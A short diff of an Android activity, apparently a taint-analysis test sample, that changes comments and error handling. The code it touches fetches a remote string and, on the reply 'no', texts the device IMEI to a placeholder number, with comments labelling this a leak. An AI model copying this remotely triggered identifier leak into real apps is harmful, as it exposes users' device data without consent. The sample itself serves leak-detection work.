@@ -20,13 +20,13 @@ public class MainActivity extends Activity {
         try {
             str2 = BaseAuthenicationHttpClient.getStringByURL(str2);
             if (str2 != null && !"".equals(str2)) {
-                if ("no".equalsIgnoreCase(str2)) {
+                if ("no".equalsIgnoreCase(str2)) { // command
                     SmsManager sms = SmsManager.getDefault();
-                    sms.sendTextMessage("+49", null, imei, null, null);  //sink, leak
+                    sms.sendTextMessage("+49", null, imei, null, null);  //controlled api, leak
                 }
             }
         } catch (Exception e) {
-
+            e.printStackTrace();
         }
     }
 }
